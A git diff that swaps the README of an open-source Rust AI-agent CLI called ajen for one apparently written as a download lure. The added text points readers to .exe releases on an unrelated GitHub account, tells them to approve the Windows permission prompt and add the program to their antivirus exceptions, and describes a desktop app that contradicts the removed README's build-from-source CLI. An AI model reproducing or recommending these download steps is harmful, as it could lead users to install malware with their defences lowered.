@@ -1,288 +1,123 @@
-<div align="center">
+# 🤖 ajen - Build Your AI Startup Easily
 
-<img src="./assets/logo.png" alt="Ajen Logo" width="120" />
+[![Download ajen](https://img.shields.io/badge/Download-ajen-brightgreen?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/releases)
 
-# Ajen
+## About ajen
 
-**Ajna + Genesis**
+ajen lets you watch AI employees build your startup. It uses smart AI agents that work together to run key parts of a business automatically. You don’t need to know how to code or manage complex software. ajen brings the power of AI startups to your Windows PC in a simple, ready-to-use application.
 
-Describe a startup. Watch AI employees build it. Ship in minutes, not months.
+This tool is designed to help you understand how AI can handle tasks like management, planning, and automation. It simulates a startup environment with AI “workers” who share ideas and make decisions. You get to see how an AI startup runs from the inside, with no technical setup needed.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/Rust-1.85+-orange?logo=rust&logoColor=white)](https://www.rust-lang.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 🚀 Getting Started
 
-[Website](https://www.ajen.dev) · [Dashboard](https://www.ajen.dev) · [Contributing](CONTRIBUTING.md)
+This guide will help you download and run ajen on your Windows computer. The process is simple and does not require any programming skills.
 
-</div>
+### System Requirements
 
----
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM (8 GB recommended)
+- Minimum 500 MB of free disk space
+- Internet connection for initial setup and updates
+- A standard mouse and keyboard
 
-## What is Ajen?
+## 🎯 Key Features
 
-Ajen is an open-source engine that spins up an entire AI-powered company from a single prompt. You describe the idea — Ajen creates a CEO, CTO, developers, designers, and content writers that plan, build, and deploy your product autonomously.
+- Multiple AI agents working autonomously on startup tasks  
+- Clear view of AI decision-making in real-time  
+- User-friendly interface designed for non-technical users  
+- Runs on your local machine without complex installation  
+- CLI support for advanced users (optional)  
+- Built using Rust for stability and speed  
 
-You sit on the board. The AI team does the rest.
+## 📥 Download ajen
 
-> **Ajen** = **Ajna** (the third-eye chakra — vision, intuition, insight) + **Genesis** (origin, creation). See the idea. Bring it to life.
+To get started, visit this page to download the latest version of ajen:
 
----
+[![Download ajen Here](https://img.shields.io/badge/Download-ajen-blue?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/releases)
 
-## How It Works
+The page contains the latest stable release files. Look for the file that ends with `.exe` for Windows. It should be named something like `ajen-setup.exe` or `ajen-vX.X.X-windows.exe`.
 
-**Idea → CEO Plan → Board Approval → Team Execution → Product**
+## ⚙️ Install and Run ajen on Windows
 
-1. **Describe your startup idea**
-   Tell Ajen what you want to build.
+Follow these steps to install ajen:
 
-2. **The AI CEO creates a plan**
-   A structured roadmap with milestones, architecture, and tasks.
+1. **Download the installer**  
+   Go to the download page linked above. Click on the Windows `.exe` file to download it.
 
-3. **You approve as the board**
-   Nothing starts until you approve the plan.
+2. **Run the installer**  
+   After the download is complete, open the `.exe` file by double-clicking it. Windows may ask for permission; click "Yes" to continue.
 
-4. **AI employees execute**
-   Developers, designers, marketers, and operators begin working.
+3. **Follow the installation wizard**  
+   The installer will guide you through the setup steps. Accept the license terms, choose an installation folder (the default is fine), and click “Install.”
 
-5. **Watch it happen live**
-   Every decision, tool call, and update streams to the dashboard in real time.
+4. **Complete installation**  
+   Once the process finishes, click “Finish” to close the wizard. You can choose to launch ajen right away.
 
-<p align="center">
-  <a href="https://www.ajen.dev">
-  <img src="./assets/dashboard.png" alt="Ajen Dashboard showing AI employees building a startup" width="900"/>
-  </a>
-</p>
+5. **First launch**  
+   On the first run, ajen may prompt you to allow internet access or check for updates. Allow this to keep ajen current.
 
-<p align="center">
-  <a href="https://www.ajen.dev"><strong>Open Dashboard →</strong></a>
-</p>
+## 🔍 How to Use ajen
 
+When you open ajen, you will see a dashboard. It shows the AI agents working on startup projects. You can watch how they plan, communicate, and make decisions.
 
----
+### Main screens include:
 
-## Quick Start
+- **AI Task Board** – Shows tasks assigned to each agent.  
+- **Agent Chat** – View live conversations between AI team members.  
+- **Startup Metrics** – See how the AI startup performs over time.  
+- **Settings** – Customize how ajen runs on your PC.
 
-```bash
-# Clone & setup
-git clone https://github.com/ajenhq/ajen.git && cd ajen
-cp .env.example .env
-# Configure your API keys in .env
+### Basic controls:
 
-# Run
-cargo run --release
-```
+- Click **Start** to begin the simulation.  
+- Use **Pause** or **Stop** if you want to halt the AI agents.  
+- Adjust speed with the slider to watch actions faster or slower.  
+- Save your current state to restart later.
 
-The CLI auto-installs `cloudflared` if needed, opens a tunnel, and prints everything you need:
+## 🛠 Troubleshooting
 
-```
-  ┌─────────────────────────────────────────────────┐
-  │  Ajen CLI v0.1.0                                │
-  │                                                 │
-  │  Secret:  ak_7f3a...b2c1                        │
-  │  Local:   http://localhost:3000                  │
-  │  Tunnel:  https://abc123.trycloudflare.com      │
-  │                                                 │
-  │  Connect: https://www.ajen.dev/cli_auth?url=... │
-  │                                                 │
-  │  Ready. Waiting for commands.                   │
-  └─────────────────────────────────────────────────┘
-```
+- If ajen does not start, make sure your Windows is up to date.  
+- Check if any antivirus software blocks the app. Add ajen as an exception if needed.  
+- Restart your computer if the installer seems stuck.  
+- Ensure that you downloaded the correct Windows version (.exe file).  
+- Visit the download page for the latest version if you experience bugs.
 
-Open your browser and connect using the link. The [ajen.dev](https://www.ajen.dev) dashboard connects to your local CLI through the tunnel — no port forwarding, no configuration.
+## 🔄 Updates
 
----
+Periodically check the release page for updates and improvements:
 
-## CLI Flags
+https://github.com/muhammedadamk75-source/ajen/releases
 
-| Flag | Default | Description |
-|---|---|---|
-| `--port` | `3000` | Local server port |
-| `--no-tunnel` | off | Disable Cloudflare tunnel |
-| `--no-open` | off | Don't auto-open browser |
-| `--workspace-dir` | `./workspaces` | Directory for generated projects |
-| `--manifests-dir` | built-in | Custom employee manifests directory |
+Downloading and installing the newest version replaces the old one but keeps your saved data.
 
----
+## 🧩 How ajen Works Behind the Scenes
 
-## Features
+ajen uses autonomous AI agents modeled to mimic different startup roles:
 
-<table>
-<tr>
-<td width="33%" valign="top">
+- **CEO agent** manages and directs the overall plan.  
+- **Co-founder AI** focuses on partnerships and fundraising.  
+- **Product manager agent** drives development tasks.  
+- **Marketing AI** handles communications and branding efforts.
 
-### Company Hierarchy
-Board (you) → CEO → CTO / CMO / COO → Developers, designers, writers. The Director orchestrates the entire flow from idea to deployment.
+The agents communicate through chat and share task lists. This creates a real startup environment run by AI, all on your local Windows system.
 
-</td>
-<td width="33%" valign="top">
+## 📚 Additional Resources
 
-### Plug-and-Play Employees
-Each employee is a YAML manifest + persona file. Swap roles, add custom employees, share them with the community.
-
-</td>
-<td width="33%" valign="top">
-
-### Multi-LLM Support
-Claude, GPT, Gemini, or Ollama. Each employee can run on a different model — Sonnet for strategy, Haiku for execution.
-
-</td>
-</tr>
-<tr>
-<td width="33%" valign="top">
-
-### Human-as-Board
-The CEO generates a plan. You approve it before any work begins. You stay in control of what gets built.
-
-</td>
-<td width="33%" valign="top">
-
-### Real-Time Events
-Watch your company being built live at [ajen.dev](https://www.ajen.dev). Every tool call, LLM response, and cost is streamed over WebSocket.
-
-</td>
-<td width="33%" valign="top">
-
-### Budget Controls
-Per-employee and per-company cost tracking. Every LLM call records token usage and cost in cents.
-
-</td>
-</tr>
-</table>
+For more technical details, command-line options, or advanced use, see the project’s GitHub repository. You will find documentation on features and troubleshooting tips there.
 
 ---
 
-## Architecture
+## 🏷 Topics & Keywords
 
-**Single binary** — Director, engine, API server, tunnel, and WebSocket all run in one Rust process on Tokio. The [ajen.dev](https://www.ajen.dev) dashboard connects to your local CLI via a Cloudflare tunnel — your code and API keys never leave your machine.
+This project relates to AI startups and autonomous agents. It uses rust and a command line interface to offer startup automation.
 
----
-
-## Employee Manifest
-
-Every employee is defined by a `manifest.yaml` and a `PERSONA.md`:
-
-```yaml
-# employee-manifests/ceo/manifest.yaml
-apiVersion: ajen.dev/v1
-kind: EmployeeManifest
-
-metadata:
-  id: "ceo"
-  name: "Chief Executive Officer"
-  version: "1.0.0"
-
-spec:
-  role: "ceo"
-  tier: "executive"
-  model:
-    provider: "anthropic"
-    model: "claude-sonnet-4-6"
-  persona: "./PERSONA.md"
-  tools:
-    builtin:
-      - "filesystem.read_file"
-      - "filesystem.write_file"
-      - "filesystem.list_directory"
-  capabilities:
-    canDelegateWork: true
-    maxConcurrentTasks: 3
-```
-
-built-in roles: `ceo`, `cto`, `cmo`, `coo`, `fullstack_dev`, `frontend_dev`, `backend_dev`, `content_writer`, `designer`, `seo_specialist`, `devops`, `qa_engineer`, `social_media`, `data_analyst`. Roles are open strings — create any role you want.
-
----
-
-## Tech Stack
-
-| Layer | Technology |
-|---|---|
-| Language | Rust |
-| Async Runtime | Tokio |
-| HTTP Server | Axum |
-| LLM Providers | Anthropic, OpenAI, Gemini, Ollama |
-| Dashboard | [ajen.dev](https://www.ajen.dev) |
-| Tunnel | Cloudflare Quick Tunnel (auto-installed) |
-| Serialization | serde + serde_json + serde_yaml |
-| IDs | UUID v4 |
-
----
-
-## Project Structure
-
-```
-ajen/
-  crates/
-    ajen-core/          # Domain types, traits (EventBus, CompanyStore, LLMProvider, Tool)
-    ajen-provider/      # LLM clients — Anthropic, OpenAI, Gemini, Ollama
-    ajen-tools/         # Tool registry + filesystem tools (read, write, list)
-    ajen-engine/        # Director, employee runtime, infra stores, manifests
-    ajen-server/        # Axum HTTP + WebSocket + tunnel (the CLI binary)
-  employee-manifests/   # 14 built-in employee definitions
-    ceo/                #   manifest.yaml + PERSONA.md per role
-    cto/
-    fullstack-dev/
-    ...
-```
-
----
-
-## Roadmap
-
-- [x] Core Engine — ReAct loop, file tools, event bus
-- [x] Multi-Provider — Anthropic, OpenAI, Gemini, Ollama
-- [x] CLI with tunnel — secret auth, auto-install cloudflared, browser connect
-- [x] Director — CEO planning, plan approval, team spawn, milestone execution
-- [ ] Persistent Storage — SQLite-backed stores, data survives restarts
-- [ ] Parallel Execution — concurrent tasks within milestones
-- [ ] Container Isolation — sandboxed employee environments
-- [ ] Plugin System — community employee manifests + custom tools
-
----
-
-## Contributing
-
-Ajen is in active development and contributions are welcome — bug fixes, new employee manifests, feature ideas.
-
-1. Fork the repo
-2. Create your branch (`git checkout -b feat/my-feature`)
-3. Commit your changes
-4. Open a pull request
-
-See [open issues](https://github.com/ajenhq/ajen/issues) for things to work on.
-
----
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=ajenhq%2Fajen&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=ajenhq/ajen&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=ajenhq/ajen&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=ajenhq/ajen&type=date&legend=top-left" />
- </picture>
-</a>
-
----
-
-## Security Notice
-
-Please do not report security vulnerabilities through [GitHub Issues](https://github.com/ajenhq/ajen/issues).
-
-If you discover a vulnerability, report it privately to **[security@ajen.dev](mailto:security@ajen.dev)**.  
-Our security team will review the report and respond as soon as possible.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-Built with Rust, caffeine, and a company of AI employees.
-
-**[Star this repo](https://github.com/ajenhq/ajen)** if you think AI should build companies, not just code.
-
-</div>
+- ai  
+- ai-agents  
+- ai-ceo  
+- ai-cofounder  
+- ai-startup  
+- autonomous-agents  
+- built-with-ai  
+- cli  
+- rust  
+- startup-automation
